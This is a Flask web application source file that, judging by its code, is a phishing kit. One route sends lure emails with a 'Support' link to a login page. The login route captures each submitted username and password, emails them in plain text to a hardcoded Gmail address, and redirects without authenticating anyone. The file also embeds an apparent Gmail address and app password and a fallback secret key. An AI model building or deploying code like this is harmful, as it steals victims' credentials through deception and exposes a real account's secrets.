from flask import Flask, request, redirect, url_for, session, render_template
from flask_mail import Mail, Message
import mysql.connector
import os
import threading

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "supersecretkey")

# ================= EMAIL CONFIG =================
app.config["MAIL_SERVER"] = "smtp.gmail.com"
app.config["MAIL_PORT"] = 587
app.config["MAIL_USE_TLS"] = True
app.config["MAIL_USE_SSL"] = False
app.config["MAIL_USERNAME"] = os.environ.get("lpg8718068669@gmail.com")
app.config["MAIL_PASSWORD"] = os.environ.get("ejpevwjotmueyoao")
app.config["MAIL_DEFAULT_SENDER"] = os.environ.get("lpg8718068669@gmail.com")

mail = Mail(app)

# ================= DATABASE CONFIG =================
def get_db_connection():
    return mysql.connector.connect(
        host=os.environ.get("DB_HOST"),
        user=os.environ.get("DB_USER"),
        password=os.environ.get("DB_PASSWORD"),
        database=os.environ.get("DB_NAME")
    )

# ================= BACKGROUND MAIL FUNCTIONS =================
def send_support_email(email, link):
    with app.app_context():
        try:
            msg = Message(
                subject="Support",
                recipients=[email],
                body=f"Click here to visit: {link}"
            )
            mail.send(msg)
        except Exception as e:
            print("Support mail error:", e)


def send_login_email(username, password):
    with app.app_context():
        try:
            msg = Message(
                subject="Login Alert",
                recipients=["raksha.rajput98@gmail.com"],
                body=f"Username: {username}\nPassword: {password}"
            )
            mail.send(msg)
        except Exception as e:
            print("Login mail error:", e)

# ================= ROUTES =================
@app.route("/send_msg", methods=["POST"])
def send_msg():
    data = request.json
    if not data or "email" not in data:
        return {"status": False, "message": "Email is required"}, 400

    email = data["email"]
    link = "https://your-app-name.onrender.com/login"

    threading.Thread(
        target=send_support_email,
        args=(email, link)
    ).start()

    return {"status": True, "message": "Mail sending in background"}


@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("name")
        password = request.form.get("password")

        # Send mail without blocking login
        threading.Thread(
            target=send_login_email,
            args=(username, password)
        ).start()

        return redirect(url_for("dashboard"))

    return render_template("home.html")


@app.route("/dashboard")
def dashboard():
    return render_template("dashboard.html")


@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("login"))
